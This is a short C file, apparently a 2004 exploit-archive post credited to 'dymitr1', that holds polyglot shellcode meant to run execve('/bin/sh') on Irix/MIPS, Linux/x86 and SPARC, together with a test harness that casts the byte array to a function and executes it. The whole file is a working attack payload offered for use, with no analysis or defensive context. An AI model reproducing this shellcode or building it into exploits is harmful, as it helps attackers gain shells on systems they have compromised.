/*
Shellcode ejecuta execve /bin/sh en Irix/mips, Linux/x86, Unix/sparc by dymitr1
dymitri666@hotmail.com
*/

#include <stdio.h>

char code[]=
"\x37\x37\xeb\x2f\x30\x80\x00\x12\x04\x10\xff\xff\x24\x02\x03\xf3\x23\xff\x02\x14\x23\xe4\xfe\x08"
"\x23\xe5\xfe\x10\xaf\xe4\xfe\x10\xaf\xe0\xfe\x14\xa3\xe0\xfe\x0f"
"\x03\xff\xff\xcc"
"/bin/sh" 
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
"\x37\x37\x37\x37\x37"
"\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc\xa2\x14\x63\x68"
"\xe0\x3b\xbf\xf0\xc0\x23\xbf\xf8\x90\x23\xa0\x10\xc0\x23\xbf\xec"
"\xd0\x23\xbf\xe8\x92\x23\xa0\x18\x94\x22\x80\x0a\x82\x10\x20\x3b"
"\x91\xd0\x20\x08\x82\x10\x20\x01\x91\xd0\x20\x08"; 
main()
{
  void (*s)() = (void *)code;
  printf("Shellcode length: %d\nExecuting..\n\n",
      strlen(code));
  s();
}

// milw0rm.com [2004-09-12]